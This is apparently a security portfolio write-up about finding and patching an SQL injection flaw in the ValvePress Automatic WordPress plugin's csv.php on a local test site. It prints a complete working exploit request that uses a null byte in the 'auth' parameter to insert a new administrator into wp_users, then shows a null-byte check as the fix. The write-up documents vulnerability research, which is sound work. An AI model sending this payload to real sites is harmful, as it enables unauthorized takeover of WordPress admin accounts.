# Discovering and Mitigating SQL Injection Vulnerabilities in the ValvePress Automatic WordPress Plugin

**Year**: *2025*

**Skills**: *SQL Injection, WordPress, Security Assessment, Plugin Development, Vulnerability Discovery, Burp Suite, Kali Linux, WPScan, OWASP ZAP, Web Application Security, Penetration Testing, Secure Coding, Prepared Statements, Authentication Bypass, PHP, Database Security, Network Security, Ethical Hacking, Threat Modeling, Vulnerability Mitigation, Bug Bounty, Web Security Best Practices, Security Testing, Application Security, Cybersecurity, Exploit Development.*

## 🛠️ Project Overview
The **ValvePress Automatic Plugin** pulls content from various sources like RSS feeds, social media, and APIs for automatic posting. However, during a security assessment, I uncovered a critical vulnerability in the plugin’s code, specifically related to how it handled SQL queries. 🔍

## 💥 Identifying the Vulnerability
Using a controlled test environment with **Kali Linux**, **WPScan**, **WPBullet**, and **OWASP ZAP**, I pinpointed an SQL injection flaw in the `csv.php` file within the plugin’s `wp-automatic/inc` folder. The flaw existed due to improper handling of the `$auth` parameter, which allowed us to inject arbitrary SQL queries and bypass authentication. 💻

<img src="/portfolio/assets/projects/vulnerability_assessment/fig1.png" class="md-img" />

## 💣 Exploitation Process
- **Intercepting Requests**: Using **Burp Suite**, I intercepted HTTP POST requests containing the `$auth` parameter. 🕵️‍♂️

<img src="/portfolio/assets/projects/vulnerability_assessment/fig2.png" class="md-img" />

- **Injecting SQL**: By modifying the `$auth` parameter, I injected SQL queries to escalate privileges and add an administrative user to the database. 🔓
    ```
    POST http://localhost/wordpress/wp-content
    /plugins/wp-automatic/inc/csv.php HTTP/1.1
    Host: localhost
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; 
    rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: text/html,application/xhtml+xml,
    application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Length: 336

    q=INSERT INTO wp_users (user_login, user_pass, user_nicename, 
    user_email, user_url, user_registered, user_status, display_name) 
    VALUES ('inseTQK', '$P$HxfvLR.Te6U9RQFKxgd345dt/7Nk8B/', 'inseTQK', 
    'inseTQK@concordia.com', 'http://168.0.0.1:8080', '2025-03-21 22:12:51', 
    0, 'inseTQK')&integ=298c8ba78748f02877a09f1a1e2006b1&auth=%00
    ```
- **Impact**: This allowed unauthorized access, including full control over the WordPress admin panel. ⚡

*Before Attack:*

<img src="/portfolio/assets/projects/vulnerability_assessment/fig3.png" class="md-img" />

*After Attack:*

<img src="/portfolio/assets/projects/vulnerability_assessment/fig4.png" class="md-img" />

## 🛡️ Mitigation
- **Null Byte Detection**: Added checks to prevent null byte injection. 🚫
- **Secure Password Validation**: Replaced insecure password handling with WordPress’s `wp_check_password()` method. 🔑

<img src="/portfolio/assets/projects/vulnerability_assessment/fig5.png" class="md-img" />

    ```
    21 | if (strpos($auth, "\0") !== false) {
    22 |    echo 'NULL byte detected';
    23 |    exit;
    24 | }
    ```
*After Mitigation:*

<img src="/portfolio/assets/projects/vulnerability_assessment/fig6.png" class="md-img" />

****************************